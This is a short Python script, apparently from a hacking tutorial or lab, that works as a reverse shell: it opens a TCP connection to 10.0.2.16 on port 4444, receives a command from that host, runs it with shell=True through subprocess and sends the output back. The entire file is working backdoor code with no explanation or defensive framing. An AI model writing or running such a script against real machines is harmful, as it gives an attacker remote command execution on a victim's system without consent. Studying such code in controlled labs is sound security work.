#!/usr/bin/env python

import socket
import subprocess

def execute_sys_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.16", 4444))

connection.send(b'\n[+] Connection established. \n')

command = connection.recv(1024)
command_result = execute_sys_command(command)
connection.send(command_result)

connection.close()
